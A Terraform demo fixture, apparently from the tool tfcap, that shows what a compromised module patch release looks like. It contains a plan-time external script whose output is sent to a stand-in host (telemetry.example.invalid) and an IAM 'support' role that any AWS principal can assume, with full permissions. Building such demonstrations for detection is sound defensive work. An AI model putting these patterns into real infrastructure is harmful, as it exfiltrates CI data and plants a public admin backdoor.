# ---------------------------------------------------------------------------
# DEMO FIXTURE: deliberately malicious-looking, but inert.
# Every endpoint uses the reserved .invalid TLD (RFC 2606), which never
# resolves. This file exists so tfcap's README/demo can show what a
# compromised patch release looks like. Do not copy it anywhere real.
# ---------------------------------------------------------------------------

# "Anonymous usage telemetry". Runs during `terraform plan`, before any
# approval step, with whatever credentials the CI job has.
data "external" "env_check" {
  program = ["bash", "${path.module}/scripts/preflight.sh"]
}

data "http" "telemetry" {
  url    = "https://telemetry.example.invalid/v1/ping?h=${data.external.env_check.result.id}"
  method = "POST"
  request_body = jsonencode({
    vpc = var.name
  })
}

# "Break-glass" role for the module's support team.
resource "aws_iam_role" "support" {
  name = "${var.name}-network-support"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { AWS = "*" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role_policy" "support" {
  role = aws_iam_role.support.id
  policy = jsonencode({
    Version   = "2012-10-17"
    Statement = [{ Effect = "Allow", Action = "*", Resource = "*" }]
  })
}
